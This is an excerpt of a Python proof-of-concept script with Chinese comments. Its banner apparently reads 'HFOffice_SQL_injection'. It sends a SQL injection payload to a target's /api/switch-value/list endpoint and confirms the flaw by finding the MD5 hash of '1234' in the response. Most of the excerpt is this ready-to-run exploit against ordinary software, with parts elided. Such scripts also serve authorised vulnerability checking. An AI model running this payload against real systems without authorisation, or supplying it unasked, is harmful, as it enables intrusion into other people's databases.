...
def banner():
    test = """
         ___  ___  __  __ _              __    ____  __     _        _           _   _             
  /\  /\/ __\/___\/ _|/ _(_) ___ ___    / _\  /___ \/ /    (_)_ __  (_) ___  ___| |_(_) ___  _ __  
 / /_/ / _\ //  // |_| |_| |/ __/ _ \   \ \  //  / / /     | | '_ \ | |/ _ \/ __| __| |/ _ \| '_ \ 
/ __  / /  / \_//|  _|  _| | (_|  __/   _\ \/ \_/ / /___   | | | | || |  __/ (__| |_| | (_) | | | |
\/ /_/\/   \___/ |_| |_| |_|\___\___|___\__/\___,_\____/___|_|_| |_|/ |\___|\___|\__|_|\___/|_| |_|
                                   |_____|            |_____|     |__/                              """
    print(test)
...
def main():
    ...
    # 添加参数
    # -u 接收单个URL链接
    parser.add_argument("-u", "--url", dest="u", type=str, help="URL目标")
...
def poc(target, output_file):
    ...
    # 定义payload
    payload = '/api/switch-value/list?sorts=%5B%7B"Field":"1-CONVERT(VARCHAR(32),%20HASHBYTES(%27MD5%27,%20%271234%27),%202);"%7D%5D&conditions=%5B%5D&_ZQA_ID=4dc296c6c69905a7'
    # 定义headers
    headers = {
    ...
    # 将读到的内容转为json/dict 格式
        ...
        # 正则表达式
        regex_pattern = r"81DC9BDB52D04DC20036DBD8313ED055"
        # 匹配正则表达式
        match = re.search(regex_pattern, res.text)

        # 如果存在，并且包含对应字符串
        if match and "81DC9BDB52D04DC20036DBD8313ED055" in match.group():
